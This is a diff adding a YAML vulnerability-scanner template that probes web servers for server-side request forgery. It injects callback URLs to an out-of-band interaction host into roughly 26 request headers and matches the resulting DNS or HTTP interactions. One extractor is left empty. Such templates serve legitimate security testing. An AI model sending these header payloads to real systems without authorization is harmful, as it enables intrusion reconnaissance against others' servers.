@@ -1,0 +1,68 @@
+id: request-header-ssrf
+
+info:
+  name: request-header-ssrf
+  author: ssrf
+  severity: high
+  tags: ssrf
+
+variables:
+  rand1: '{{rand_int(111, 999)}}'
+  rand2: '{{rand_int(111, 999)}}'
+
+http:
+  - raw:
+      - |
+        GET / HTTP/1.1
+        Host: {{Hostname}}
+        X-Forwarded-For: http://{{rand1}}{{rand2}}.XForwardedFor.{{interactsh-url}}
+        X-Target-Url: http://{{rand1}}{{rand2}}.XTargetUrl.{{interactsh-url}}
+        X-Proxy-Url: http://{{rand1}}{{rand2}}.XProxyUrl.{{interactsh-url}}
+        x-real-url: http://{{rand1}}{{rand2}}.XRealUrl.{{interactsh-url}}
+        x-screenshot-url: http://{{rand1}}{{rand2}}.XScreenShotUrl.{{interactsh-url}}
+        X-Forwarded-Host: http://{{rand1}}{{rand2}}.XForwardedHost.{{interactsh-url}}
+        x-proxy-final-url: http://{{rand1}}{{rand2}}.XProxyFinalUrl.{{interactsh-url}}
+        x-proxy-request-url: http://{{rand1}}{{rand2}}.XProxyRequestUrl.{{interactsh-url}}
+        Location: http://{{rand1}}{{rand2}}.Location.{{interactsh-url}}
+        Origin: http://{{rand1}}{{rand2}}.Origin.{{interactsh-url}}
+        Referer: http://{{rand1}}{{rand2}}.Referer.{{interactsh-url}}
+        X-Origin: http://{{rand1}}{{rand2}}.XOrigin.{{interactsh-url}}
+        X-Client-IP: http://{{rand1}}{{rand2}}.XClientIP.{{interactsh-url}}
+        X-Remote-IP: http://{{rand1}}{{rand2}}.XRemoteIP.{{interactsh-url}}
+        X-Remote-Addr: http://{{rand1}}{{rand2}}.XRemoteAddr.{{interactsh-url}}
+        X-Originating-IP: http://{{rand1}}{{rand2}}.XOriginatingIP.{{interactsh-url}}
+        True-Client-IP: http://{{rand1}}{{rand2}}.TrueClientIP.{{interactsh-url}}
+        Originating-IP: http://{{rand1}}{{rand2}}.OriginatingIP.{{interactsh-url}}
+        X-Real-IP: http://{{rand1}}{{rand2}}.XRealIP.{{interactsh-url}}
+        Forwarded: http://{{rand1}}{{rand2}}.Forwarded.{{interactsh-url}}
+        Client-IP: http://{{rand1}}{{rand2}}.ClientIP.{{interactsh-url}}
+        X-Forwarded-Proto: http://{{rand1}}{{rand2}}.XForwardedProto.{{interactsh-url}}
+        Proxy: http://{{rand1}}{{rand2}}.Proxy.{{interactsh-url}}
+        Redirect: http://{{rand1}}{{rand2}}.Redirect.{{interactsh-url}}
+        X-Proxy-Host: http://{{rand1}}{{rand2}}.XProxyHost.{{interactsh-url}}
+    stop-at-first-match: true
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: interactsh_protocol # Confirms the DNS Interaction
+        words:
+          - "dns"
+          - "http"
+        condition: or
+      - type: regex
+        part: interactsh_request
+        regex:
+          - '\d{6}\.([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+'
+    extractors:
+      - type: kval
+        kval:
+      - type: regex
+        group: 2
+        regex:
+          - '\d{6}\.([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+'
+        part: interactsh_request
+      - type: regex
+        group: 1
+        regex:
+          - '\d{6}\.([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+'
+        part: interactsh_request
